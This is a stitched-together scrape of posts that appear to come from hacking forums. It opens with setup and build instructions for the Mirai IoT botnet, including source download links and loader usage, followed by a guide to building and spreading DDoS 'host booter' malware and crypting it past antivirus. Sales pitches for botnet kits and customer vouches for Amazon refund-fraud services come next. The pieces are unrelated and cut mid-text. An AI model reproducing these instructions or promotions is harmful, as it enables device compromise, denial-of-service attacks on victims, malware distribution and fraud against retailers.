""127.0.0.1"" const DatabaseUser string = ""root"" const DatabasePass string = ""password"" const DatabaseTable string = ""mirai"" To the information for the mysql server you just installed Setting Up Cross Compilers Cross compilers are easy, follow the instructions at this link to set up. You must restart your system or reload .bashrc file for these changes to take effect. http://pastebin.com/1rRCc3aD Building CNC+Bot The CNC, bot, and related tools: 1) http://santasbigcandycane.cx/mirai.src.zip - THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP! 2) http://santasbigcandycane.cx/loader.src.zip - THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP! How to build bot + CNC In mirai folder, there is build.sh script. Code ./build.sh debug telnetWill output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder Code ./build.sh release telnetWill output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: ""mirai.$ARCH"" to ./mirai/release folder Building Echo Loader Loader reads telnet entries from STDIN in following format: Code ip:port user:passIt detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget. You can find code to compile the tiny downloader stub h ere http://santasbigcandycane.cx/dlr.src.zip You need to edit your main.c for the dlr to include the HTTP server IP. The idea is, if the iot device doesn have tftp or wget, then it will echo load this 2kb binary, which download the real binary, since echo loading really slow. When you compile, place your dlr.* files into the folder ./bins for the loader Code ./build.shWill build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this Code cat file.txt | ./loader Remember to ulimit! Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials or Clay Davis, too much time. All scripts and everything are included to set up working botnet in under 1 hours. I am willing to help if you have individual questions (how come CNC not connecting to database, I did this this this blah blah), but not questions like ""My bot not connect, fix it""",,,,,

I promise you they aren't, and won't cause any harm to your computer as long as they're used correctly. What is Host Booting? Host Booting is a form of DDoS (Distributed Denial of Service). You build a botnet which are zombies/bots (infected computers), and you attack a specified IP with a Clay Davis load of packets. The person's modem or router becomes overwhelmed with information and slows down, possibly stops working depending on the size of your attack. Host booters are usually used for cheating in video games, but many have a TCP or SYN flood options for attacking websites. Another way to DDoS is using IRC botnets, to learn how to make an IRC botnet, click here.

Edit all other settings to your liking, then click the ""Build"" button. The server you just created will be in the same folder that the client is located. Go to the ""Options"" tab in the client and put the port that you used to create your server in the ""Auto-Listen Port"" textbox and then click ""Save Settings"" Now all you need to do is spread the server.exe.

For ""Type:"" scroll down to ""Text String"". Once you've done that click on ""Either"" on the options. Now for the ""Value"" type in ""EDIT"" and click OK. Now you'll see ""EDITT22.no-ip.info"", so now you will have to go to HERE Be sure to use a real email address because you will need to verify it. Now login to and click ""Add a Host"" make your no-ip hostname 7 charactors. Example :: ABCD123.no-ip.info Go back to your Hex Workshop and edit the ""EDITT22"" to the no-ip you chose. Go to File > Save. Spreading Your Bot/Virus Spreading is the hardest part of the process, finding where all the stupid people download from. One method of spreading is torrents. To find out how to make and spread torrents click here. Another method is YouTube videos. You make a video of something that someone wants, upload your virus to a downloading site like MediaFire and say it's what they want. You can also spread on forums. I won't explain it all, just say it's something that the members would want and post it for download. Crypting and Binding Binders and crypters are used to make your virus less detectable by Anti-Virus programs. Binders allow you to combine your virus with another file, meaning that both files will open. Crypters are used to usually just make your virus less detectable. Some advanced ones can compress and do a lot of other things too. There are a lot of free ones, but paid and privately sold crypters are usually much better. Port Forwarding You need to open ports to accept the incoming connections from the infected zombies, and also to send outgoing commands to them. For help on opening ports please go to http://portforward.com/ The ports that the above host booters run on are listed directly below the title of them.

I thought this would be a good time to share the new features we have added to DDoSeR 4.0 and also post some preview pictures. New Features: - New GUI - Injection (Firewall Bypass) - Recoded DDoS (Increased stability and response speed) - Recoded Base (Client & Bot) - Zombie builds at 75kb (All features enabled {Because of base recode}) - Recoded Update/Download (Increased infection rate) - New builder (More optional etc) - Server ID Added (Helps people when spreading comes into play) - Improved Victim History (More advanced) - Detach Window (For DDoS) - Zombie IP Finder - New Security (No more load time etc, also was a 3.6 update) + More small things I am forgetting Other Information: - Will still be sold automatically on our website for $35.00 USD - Update fee for our 3.6 customers is $10.00 USD (Also will be automatic) - You will get 4.x updates free (Most likely we wont even go to 5.0, took a year to even get to 3.0-3.6) - Preview video(s) coming soon (Will be added tonight or tomorrow) [img]http://www.ddoser-project.com/images/program/4.0/Client.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Multi-Command-(RightClick).png[/img] [img]http://www.ddoser-project.com/images/program/4.0/DDoS-Settings.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Form&Detach-Window-Stuck.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Builder.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Builder-Main-Settings.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Builder-Installation.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Builder-Startup.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Builder-FirewallBypass.png[/img] [img]http://www.ddoser-project.com/images/program/4.0/Builder-Build-Server.png[/img] This forum allows 10 images each post, so please for the other pictures visit our website.

It was created for HUGE botnets I am guessing about the commands here and made up commands that would be as small as possible. I do not know what commands the bot uses, so this is more of an educated guess, but a pretty accurate one. I am going to show that the principle behind the bot will host a big net, even on metered bandwidth. Warning, contains math! Spoiler (Click to View) For example lets say you have a host with a 20gb bandwidth limit for the month, and that your bots are online 24/7 The command Code u_98.34.24.233:80 is 17 bytes the bot loads the txt file every 15 seconds, and there are 60 seconds in a minute Code 60 / 15 = 4so the text file will be loaded 4 times a minute Code 17 * 4 = 68 bytes per minute60 minutes in an hour Code 68 * 60 = 4080 bytes per hour for one bot24 hours in a day Code 4080 * 24 = 97,920 bytes (97.92 kb) per day per botMost months have 31 days in them Code 97,920 * 31 = 3,035,520 bytes (3.03552 mb) per month per botSo if you have 333 bots Code 3,035,520 * 333 = 1,010,828,160 bytes (1.01082816 gb) usageSo aproximately, in order to fill your 20gb a month limit Code 333 * 20 = 6660 bots would be neededBut here's the thing, you arent going to be issuing commands 24/7 are you? no. I imagine the client empties the text file when the stop command was issued or the client closed, thereby the loading of the txt file shouldnt hurt your bandwidth because it is transfering a total of 0 bytes So lets say you were using the bot heavily, like 50% of the time a command was posted (this would be very heavy usage), since half the time no bandwidth is used, then it cuts our bandwidth usage in half, thereby doubling the ammount of bots able to be used without exceding the bandwidth limit Code 6660 * 2 = 13320 botsNow heres the thing, you could have multiple hosts, and sending the command to 3 php files for every command wouldn't be that hard (just copying and pasting the php command and editing it to use a different host) So with having active commands on 50% of the time, our bot number triples Code 13320 * 3 = 39960 bots, quite the substantial netNow this is all theory, but this looks like it could be a very bandwidth friendly way of controlling bots The only big issue besides your host shutting you down that I can think of, is that all those bots connecting to your site would probably ddos it, but most people on HF wont even amass a net of that magnitude, so it probably wont affect most of you. Even if you did, I'm pretty sure you would be smart enough to buy some good unmetered offshore hosting. There are some free unlimeted bandwidth sites out there as well. Please let me know if I made any mistakes",,,,,

Since ï¿_Bot, I have been wanting to develop a new bot, faster, more stable and more powerful than any other bot free or on the market. And I wanted to make it open source. Initially I planned on developing Cloud.NET (before its temporary merger with Black Trinity), it was designed from the ground up, primarily using jQuery, HTML5, CSS3 and PHP. It was designed like some of the classic botnets, using a desktop like experience. We were close to completion but... I moved countries and due to the country being firewalled i stopped development, I did pick up the code here and again and was still in touch with my old development partner but i never really got back into development of it. After a while we decided to start developing a new bot... ""ï¿_Bot v2"" - it was looking amazing and some of the features we had planned were really gonna change security for botnets (sub panel support, encryption between bot and panel, ssl support and basic p2p support so that in the event of main panel closure, all bots could be set to a new panel with a button press), however again, development slowed and ultimately stopped. I do see myself redeveloping one of these bots and releasing it, but not at the moment... to much going on right now. All I can say is, keep an eye out, it'll come... -Adzz [img]http://i.min.us/idS5OG.gif[/img] ï¿_BOT, originally named ""WEBNET"", is a stable HTTP bot created for the use of herding and is perfect for collecting hundereds, and thousands of bots at an affordable price. The simple to use interface and reliable bot allows you to control your botnet with confidence, knowing your bots are safe and stable is what botnet masters need most, and this is what we provide to you with ï¿_BOT.

He gives customers very friendly service. He is very well informed, and was able to swiftly answer all my questions politely and professionally. For a first timer, he handled the order smoothly and guided me through all aspects of the order. He was able to get replacements for each of the original items in merely ~24 hours after contacting him, and insisted on charging me 50% of his original fee. This is how customer service should be, and I'll certainly be a returning customer in the future! As he also boasts low rates, there's no reason why anybody should go with anyone other than @ Incaa . I'll add a picture of the replacement items once they arrive in a few days. THANKS!",,,,,

The returns process was not the easiest either no fault of SMETONAS, ONEPLUS them self make you request a return package per device not just all at once.

Got my order placed. If this goes through, then MASSIVE vouch for OP... This will be a $500+ refund if it work via Amazon. UPDATED FULL VOUCH Ok So Lemme tell you about this service. First off, absolutely amazing support. Guided through the ENTIRE process. We took roughly 3 hours last night setting up this order ensuring that EVERYTHING would go smooth as absolute butter. I have Amazon Prime and that includes having access to 1-Day Shipping. Only prob was I could only send it to a relatives house about 20 miles away. That's no prob at all. Went down there prior to the order going into the ""Out For Delivery"" stage and waited in HUGE anticipation. As soon as I saw the order was delivered, I snapped the first picture. I was absolutely skeptical about everything to be honest, but AngelDust is a fucking hero. I told him prior to making the order that I had $545 to spend and it was all of my money. Now we're currently waiting for it to hit my bank and I'll be tipping him HARD cash. To give you the truest idea of how G this guy is, he did my refund while playing slots XD I shit you not... All bullshit aside, I will ABSOLUTELY be a returning customer to AngelDust and I forsee a fantastic business model between him and I. Spoiler",,,,,

I only ordered like $200 worth of stuff because it was my first time doing refund services and wow.....I was mindblown. Roboman has really good prices and he responds quick af on discord so if it is your first time doing refunds like it was for me.....go hit up roboman. I don't really know what else to say but if you want proof that hes legit just pm me on nulled or ask me on discord (simply#8036) He refunded my money within the same day which was also pretty insane. Seriously go hit up roboman huge vouch for him,,,,,

Have to say that i and my friends had numerous of deals with OP on other forums. He even had so called ""learning group for refunding"" where he gave some lesson how to refund few cloth companies, so people ain't need to spend 20% for few t-shirts. Later on he closed that and expanded. pros : + he is super friendly if you are not acting like a mentally challanged idiot ... be decent human and he'll treat you as own brother + low prices - if you buy in bulk he can even lower % or two + updates you constantly (no need to spam his shit for updates) + accepting various of payment processor and is not forcing you to pay upfront or to pay in crypto etc + did not scam single guy on other forum cons : - he is taking his faculty too serious and loves to hold on his service while preparing for exams (he ain't need diploma tho due to money he is making with refunding he can live jobless 4ever) - sometimes he takes way too many orders and you need to wait few hours before he process your order (it does not impact on outcome) So if you are not clicking him to suck info how to do certain store and waste his time? He will be your another brother ... with other words : do not waste his time, dude is really pro level refunder. 10/10 GLWS! post script : With this post i'm making myself obligated to get permban if this user does any scam or deceiving.
